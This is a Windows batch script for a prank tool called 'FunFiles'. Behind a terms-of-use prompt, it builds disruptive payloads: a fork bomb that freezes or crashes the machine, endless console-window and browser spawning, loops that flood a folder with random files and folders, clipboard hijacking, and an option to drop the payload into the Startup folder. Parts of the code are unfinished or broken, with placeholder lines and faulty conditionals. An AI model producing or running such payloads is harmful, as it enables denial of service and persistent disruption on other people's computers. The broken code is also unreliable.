:FirstTimeUse
@echo off && color 0e && cls && mode con: cols=50 lines=10 && title Checking ^if used before
cd %USERPROFILE%\Documents\ || cd %USERPROFILE%\Dokument\
if not exist %USERPROFILE%\Documents\FunTime ( mkdir %USERPROFILE%\Documents\FunTime ) else ( goto start )
echo Hmm... I assume you've never used this
echo file before. Before I can let you run this
echo file, I will need you to accept the Terms of
echo using this file before you can do anything else.
set /p ok="Ok? [Y]es/[n]o: "
echo.
if ok equ Y cls && goto continue
if ok equ y cls && goto continue
if ok equ N cls && exit
if ok equ n cls && exit
if ok equ "" cls && exit

:continue 
cd %USERPROFILE%\Documents\FunTime\
echo Creating the Agreement file...
echo -- Fun Files -- >> FunFiles.txt
echo. >> FunFiles.txt
echo This file is just to check if >> FunFiles.txt
echo you've agreed/disagreed to the terms >> FunFiles.txt
echo of using FunFiles.bat >> FunFiles.txt
echo Almost done...
echo As long as you use FunFiles.bat, keep this folder >> FunFiles.txt
echo ofcourse this file as well. >> FunFiles.txt
echo.  >> FunFiles.txt
echo Agreed = 0 >> FunFiles.txt
echo. >> FunFiles.txt
echo Done!
echo.
pause
cls
goto Agreement

:Agreement
color 04 && cls && mode con: cols=40 lines=10 && title Agreement
echo #######################################
echo  By accepting these terms, you
echo  accept that any damage done by
echo  using these files contained here
echo  will be on your own shoulders,
echo  I, Fredrik, can't be held responsible
echo  for your actions.
echo #######################################
echo.
set /p agree=" Do you accept? [Y]es/[N]o: "
echo.
if agree equ Y cls && goto Rewrite
if agree equ y cls && goto Rewrite
if agree equ N  exit
if agree equ n  exit
if agree equ ""  exit

:Rewrite
REM this is for FunFiles.txt
cd %USERPROFILE%\Documents\FunTime\ || cd %USERPROFILE%\Dokument\FunTime\ && del /q FunFiles.txt
echo -- Fun Files -- >> FunFiles.txt
echo. >> FunFiles.txt
echo This file is just to check if >> FunFiles.txt
echo you've agreed/disagreed to the terms >> FunFiles.txt
echo of using FunFiles.bat >> FunFiles.txt
echo As long as you use FunFiles.bat, keep this folder >> FunFiles.txt
echo ofcourse this file as well. >> FunFiles.txt
echo.  >> FunFiles.txt
echo Agreed: 1 >> FunFiles.txt
echo. >> FunFiles.txt
echo.
goto start

:start
@echo off && color 0e && cls && mode con: cols=50 lines=10 && title Checking ^if used before
cd %USERPROFILE%\Documents\FunTime\ || cd %USERPROFILE%\Documents\FunTime\
if not exist %USERPROFILE%\Documents\FunTime\FunFiles.txt || %USERPROFILE%\Dokument\FunTime\FunFiles.txt ( goto FirstTimeUse ) else ( goto Main )
:Main
color 0e && cls && mode con: cols=71 lines=20 && title Step 1: Options
set a=Run
set b=Create
set c=Startup
set d=Exit

echo #######################################################################
echo.
echo  ______          ______ _ _           
echo  ^|  ___^|         ^|  ___(_) ^|          
echo  ^| ^|_ _   _ _ __ ^| ^|_   _^| ^| ___  ___ 
echo  ^|  _^| ^| ^| ^| '_ \^|  _^| ^| ^| ^|/ _ \/ __^|   A little program
echo  ^| ^| ^| ^|_^| ^| ^| ^| ^| ^|   ^| ^| ^|  __/\__ \   made by: 
echo  \_^|  \__,_^|_^| ^|_\_^|   ^|_^|_^|\___^|^|___/   (name goes here)
echo.
echo #######################################################################
echo.
echo Options:
echo  [1] %a%            Runs the program.
echo  [2] %b%         Creates a file for you to run.
echo  [3] %c%        Creates a file and places it in startup folder.
echo  [4] %d%           Just like it says, exits.
echo.
set /p type=" Option: "
echo.
if %type% equ " " echo Invalid choice. && pause && goto start else goto options
if %type% gtr 4 echo Invalid choice. && pause && goto start else goto options
if %type% equ 4 exit
if %type% equ 1 set typ=1 && goto options
if %type% equ 2 set typ=2 && goto options
if %type% equ 3 set typ=3 && goto options

:options
mode con: cols=71 lines=23 && cls && title Step 2: Type of File
set a=Multiply
set b=Freeze
set c=Rndm Files
set d=Rndm Folders
set e=Loop Browsers
set f=Rndm site - Clip
set g=Menu
set h=Exit

echo #######################################################################
echo.
echo  ______          ______ _ _           
echo  ^|  ___^|         ^|  ___(_) ^|          
echo  ^| ^|_ _   _ _ __ ^| ^|_   _^| ^| ___  ___ 
echo  ^|  _^| ^| ^| ^| '_ \^|  _^| ^| ^| ^|/ _ \/ __^|   A little program
echo  ^| ^| ^| ^|_^| ^| ^| ^| ^| ^|   ^| ^| ^|  __/\__ \   made by: 
echo  \_^|  \__,_^|_^| ^|_\_^|   ^|_^|_^|\___^|^|___/   (name goes here)
echo.
echo #######################################################################
echo.
echo Type of File:
echo  [1] %a%            Console Windows, multiply itself.
echo  [2] %b%              Freezes the computer, ev. crashes.
echo  [2] %c%          Creates Files /w random names.
echo  [3] %d%        Creates Folders /w random names.
echo  [4] %e%       Starts a bunch of browsers.
echo  [5] %f%    Adds a random link to clipboard.
echo  [6] %g%                Goes back to the start.
echo  [7] %h%                Just like it says, exits.
echo. 
set /p Opt=" Type: "
echo.
if %Opt% equ " " echo Invalid choice. && pause && goto options else goto location
if %Opt% gtr 7 echo Invalid choice. && pause && goto options else goto location
if %Opt% equ 1 set fil=1
if %Opt% equ 2 set fil=2
if %Opt% equ 3 set fil=3
if %Opt% equ 4 set fil=4
if %Opt% equ 5 set fil=5
if %Opt% equ 6 set fil=6
if %Opt% equ 7 goto start
if %Opt% equ 8 exit

:location
mode con: cols=71 lines=19 && cls && title Step 3: Location
set def=Default
set cust=Custom
set skp=Skip
set me=Menu
set ex=Exit

echo #######################################################################
echo.
echo  ______          ______ _ _           
echo  ^|  ___^|         ^|  ___(_) ^|          
echo  ^| ^|_ _   _ _ __ ^| ^|_   _^| ^| ___  ___ 
echo  ^|  _^| ^| ^| ^| '_ \^|  _^| ^| ^| ^|/ _ \/ __^|   A little program
echo  ^| ^| ^| ^|_^| ^| ^| ^| ^| ^|   ^| ^| ^|  __/\__ \   made by: 
echo  \_^|  \__,_^|_^| ^|_\_^|   ^|_^|_^|\___^|^|___/   (name goes here)
echo.
echo #######################################################################
echo.
echo Location:
echo  [1] %def%              Desktop, choosen if nothing else is entered.
echo  [2] %cust%             Custom, you choose the location.
echo  [3] %skp%           This makes the file in startup folder.
echo  [4] %me%                 Goes back to the start.
echo  [5] %ex%            Just like it says, exits.
echo  Note, if chosen to place item 
echo.
set /p loc=" Location: "
if %loc% equ 2 set /p locate="Path: "
echo.
if %loc% equ "" *Desktop*
if %loc% gtr 5 echo Invalid choice. && pause && goto location else 
if %loc% equ 4 goto start
if %loc% equ 5 exit

REM THESE ARE THE TYPES OF FILES THAT'S SUPPOSED TO RUN WHEN CHOSEN ABOVE (above location).
 
:SelfMultiply
REM Type: 1
@echo off && color 0e && cls
set /A qq=11
:Loop1
if qq GTR 10 start cmd && goto Loop1

:Freeze
REM Type: 2
%0|%0
goto Freeze

:RdmFiles
@echo off && color 0e && cd %locate% && cls
set /A qq=11
:Loop2
if qq gtr 10 if not exist echo. >> %random%.%random.% else echo. >> %random%%random%.%random% else echo. >> %random%.%random%%random%. else echo. %random%%random%.%random%%random%
goto Loop2

:RdmFolder
@echo off && color 0e && cd %locate% && cls
set /A qq=11
:Loop3
if qq gtr 10 if not exist mkdir %random% else mkdir %random%%random.% else mkdir %random%%random%%random% else mkdir %random%%random%%random%%random% else mkdir %random%%random%.%random%%random%%random%
goto Loop3

:Browsers
start firefox
start chrome
start opera
start iexplore
start microsoft-edge:
start chromium-browser
start maxthon
goto Browsers

:RdmClip
*Get clipboards from a txt file (in FUN folder)*

echo %clip% | clip
goto RdmClip